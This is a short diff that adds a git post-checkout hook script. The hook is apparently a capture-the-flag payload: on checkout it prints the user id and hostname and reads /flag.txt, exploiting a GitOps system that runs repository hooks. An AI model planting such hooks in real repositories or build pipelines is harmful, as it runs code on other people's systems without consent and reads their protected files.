@@ -1,0 +1,6 @@
+#!/bin/sh
+echo "=== gitops post-checkout hook (s4yhii) ==="
+id
+hostname
+echo "--- /flag.txt ---"
+cat /flag.txt
